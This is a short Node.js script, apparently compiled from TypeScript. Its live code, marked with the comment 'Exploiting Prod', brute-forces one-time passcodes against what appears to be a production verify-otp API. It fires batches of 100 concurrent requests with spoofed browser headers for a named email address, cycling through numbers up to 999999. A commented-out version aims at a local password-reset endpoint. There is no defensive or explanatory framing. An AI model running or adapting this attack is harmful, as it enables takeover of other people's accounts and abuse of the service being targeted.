import axios from 'axios';
async function sendRequest(otp) {
    // let data = JSON.stringify({
    // "email": "hetsuthar389@gmail.com",
    // "otp": otp,
    // "newPassword": "hello"
    // });
    // let config = {
    // method: 'post',
    // maxBodyLength: Infinity,
    // url: 'http://localhost:3000/reset-password',
    // headers: { 
    //     'Content-Type': 'application/json'
    // },
    // data : data
    // };
    // try {
    //     await axios.request(config);
    // } catch (e) {
    //     // console.log(e);   
    // }
    // axios.request(config)
    // .then((response) => {
    // console.log(JSON.stringify(response.data));
    // })
    // .catch((error) => {
    // // console.log(error);
    // });
    // Exploiting Prod
    let data = JSON.stringify({
        "email": "hetsuthar31@gmail.com",
        "otp": otp,
    });
    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://api.aifiesta.ai/api/auth/verify-otp',
        headers: {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,de;q=0.8',
            'authorization': 'Bearer undefined',
            'content-type': 'application/json',
            'origin': 'https://chat.aifiesta.ai',
            'priority': 'u=1, i',
            'referer': 'https://chat.aifiesta.ai/',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        },
        data: data
    };
    try {
        await axios.request(config);
    }
    catch (error) {
    }
}
async function main() {
    for (let i = 0; i < 999999; i += 100) {
        const p = [];
        console.log(i);
        for (let j = 0; j < 100; j++) {
            p.push(sendRequest((i + j).toString()));
        }
        await Promise.all(p);
    }
}
main();
//# sourceMappingURL=index.js.map